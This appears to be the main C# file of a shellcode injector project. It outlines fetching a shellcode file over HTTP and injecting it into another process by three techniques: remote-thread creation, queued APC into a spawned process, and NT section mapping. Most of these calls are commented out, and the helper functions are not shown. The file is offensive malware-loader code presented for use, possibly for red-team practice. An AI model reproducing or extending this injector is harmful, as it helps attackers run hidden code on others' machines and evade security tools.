using System;
using static Shellcode_Injector.WinApi;

namespace Shellcode_Injector
{
    internal class Program
    {
        static void Main()
        {
            //Initialize the class so the constructor can populate the static methods
            new WinApi();

            // Fetch shellcode
            //byte[] shellcode = Helpers.Fetch("http://localhost:8080", "calc.bin");

            //var pid = 9776;
            //var phand = Helpers.GetHand(pid);

            // Standard flow -> virtualallocex, virtualprotextex, writeprocessmemory, createremotethread
            //IntPtr rmem = Helpers.MWrite(phand, shellcode);
            //Helpers.SCRun("crt", phand, rmem);


            // queue user apc flow trough creating new process
            WinApi.PIN pinfo = Helpers.StartS(true, 2132);
            //IntPtr mem = Helpers.MWrite(pinfo.hProcess, shellcode);
            //Helpers.SCRun("qua", pinfo.hThread, mem);


            // ntdll.dll approach, it can be used with created process or remote process
            // ntcreatesection, ntmapviewofsection, copy shellcode, ntmapviewofsection to remote process
            //var sc_size = (ulong)shellcode.Length;
            //var hsec = IntPtr.Zero;
            //IntPtr ntmem = Helpers.NTMWrite(pinfo.hProcess, shellcode);
            //Helpers.NTSCRun("ncte", pinfo.hProcess, ntmem);
            //Helpers.NTSCRun("nqat",pinfo.hThread, ntmem);
        }
    }
}
